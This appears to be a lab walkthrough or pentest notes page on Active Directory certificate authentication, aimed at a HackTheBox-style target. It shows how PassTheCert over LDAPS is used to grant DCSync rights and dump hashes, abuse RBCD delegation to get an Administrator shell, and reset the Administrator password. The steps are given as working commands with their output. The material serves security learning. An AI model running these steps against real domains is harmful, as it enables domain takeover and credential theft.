Active Directory supports certificate authentication over two protocols by default: `Kerberos` and `Secure Channel (Schannel)`.

## PKINIT and Kerberos Authentication
`PKINIT` (Public Key Cryptography for Initial Authentication in Kerberos) is an extension of the Kerberos protocol that enables public key cryptography for initial authentication. Traditional Kerberos relies on symmetric key cryptography for authentication, where a client and a Key Distribution Center (KDC) share a secret key.
`PKINIT`, on the other hand, allows clients to authenticate to the KDC using public key cryptography during the initial authentication process. This provides additional security benefits, especially in scenarios where symmetric key distribution might be challenging or less secure.
In the context of Kerberos and ADCS, `PKINIT` utilizes `X.509 certificates` issued by `ADCS` to support public key cryptography during the initial authentication phase in Kerberos. `ADCS` issues the necessary certificates to the entities (clients, KDCs) involved in the `PKINIT` process, allowing them to use public-private key pairs for authentication within the Kerberos framework.

## Secure Channel (Schannel) Authentication
On the other hand, `Schannel`, Window's security support provider for `TLS/SSL connections`, handles client authentication by allowing a remote server to verify the connecting user's identity. This process relies on PKI, using certificates as the main credential. During the TLS handshake, the server requests the client's certificate for authentication. The client, equipped with a CA-issued client authentication certificate trusted by the server, sends it over. Upon validation by the server, assuming all is well, access is granted.
Initially, `Schannel` tries to link the credential to a user account using `Kerberos's S4U2Self` feature. If that fails, it attempts to associate the certificate with a user account using various methods outlined in the [Remote Certificate Mapping Protocol (MS-RCMP) specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rcmp/d16ed463-f75d-47f5-b19f-e026bcf1bffe), such as the certificate's SAN extension or a combination of subject and issuer fields.
In default settings, only a few protocols in an Active Directory environment support authentication through `Schannel` immediately. While `WinRM`, `RDP`, and `IIS` can employ `Schannel` for client authentication, additional setup is necessary. However, `LDAPS` (LDAP over SSL/TLS) commonly works assuming Active Directory Certificate Services is configured.


# PKINT not available...
It's important to keep in mind that there could be situations where authentication with `Kerberos` using certificates may not be an option, despite being the default authentication protocol of Active Directory. In such cases, we can resort to using *Schannel*, an alternative method, for authenticating with certificates when PKINIT is not supported.

### How to identify?
If you will ever stumble upon this particular error during the authentication phase to obtain a valid *TGT* from a *pfx*.
```
certipy-ad auth -pfx administrator.pfx

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```
For a Key Distribution Center to enable `Smart Card Logon`, its certificate must include the `Smart Card Logon EKU`. If `PKINIT` fails, it could signal that <font color="#ff0000">the KDCs we're targeting lack certificates containing the required EKU.</font>

## Bypass method(DCSync)
We need to use a third party tool to perform an actual *"PassTheCertificate"* but via LDAP/S instead.
```
git clone -q https://github.com/AlmondOffSec/PassTheCert
python3 passthecert.py 
```
We need first to export the **public key** from the *pfx*.
```
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'user.crt'

OR
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
```
And the **private key** from the *pfx*.
```
certipy-ad cert -pfx administrator.pfx -nocert -out user.key 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'user.key'

OR
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
```
Next we need to grant the permission to our user to be able to perform a *DCSync* attack.
```
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action modify_user -target blwasp -elevate

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Granted user 'blwasp' DCSYNC rights!
```
And lastly attack as usual.
```
secretsdump.py 'authority.htb/blwasp':'Password123!'@10.129.229.56

Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
<SNIP>
```

## Bypass method(RBCD)
This second method is almost same but the main attack vector uses a RBCD(Resource based constrain delegation).
We need to use a third party tool to perform an actual *"PassTheCertificate"* but via LDAP/S instead.
```
git clone -q https://github.com/AlmondOffSec/PassTheCert
python3 passthecert.py 
```
We need first to export the **public key** from the *pfx*.
```
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'user.crt'

OR
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
```
And the **private key** from the *pfx*.
```
certipy-ad cert -pfx administrator.pfx -nocert -out user.key 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'user.key'

OR
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
```
We must start by adding a "dummy" computer object to AD, should be possible to join up to 10 machines to AD by default.
```
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action add_computer -computer-name 'HTB02$' -computer-pass AnotherComputer002

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account HTB02$ with password AnotherComputer002.
```
Next adding the RBCD rights over the freshly added machine.
```
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HTB02$'

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] HTB02$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     HTB02$       (S-1-5-21-622327497-3269355298-2248959698-12604)
```
Request a TGT directly from your machine.
```
impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/HTB02$:AnotherComputer002'

Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
If clockskrew issues appears please match your time with the DC via NTP protocol.
```
sudo ntpdate 10.129.229.56

27 Nov 14:28:42 ntpdate[285269]: step time server 10.129.229.56 offset +14399.815018 sec
```
Enjoy the TGT to take if further into attacking the environment.
```
export KRB5CCNAME=Administrator.ccache 
impacket-wmiexec -k -no-pass authority.authority.htb

Impacket v0.11.0 - Copyright 2023 Fortra
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```


## Bypass method(Password Reset)
The third methos still uses the same third party tool but the main vector spins around a password reset.
We need to use a third party tool to perform an actual *"PassTheCertificate"* but via LDAP/S instead.
```
git clone -q https://github.com/AlmondOffSec/PassTheCert
python3 passthecert.py 
```
We need first to export the **public key** from the *pfx*.
```
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'user.crt'

OR
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
```
And the **private key** from the *pfx*.
```
certipy-ad cert -pfx administrator.pfx -nocert -out user.key 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'user.key'

OR
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
```
We can reset the Administrator's password via the following commando.
```
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action modify_user -target administrator -new-pass HackingViaLDAPS001

Impacket v0.11.0 - Copyright 2023 Fortra
[*] Successfully changed administrator password to: HackingViaLDAPS001
```
And lastly authenticating.
```
impacket-wmiexec administrator:HackingViaLDAPS001@10.129.229.56

Impacket v0.11.0 - Copyright 2023 Fortra
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```
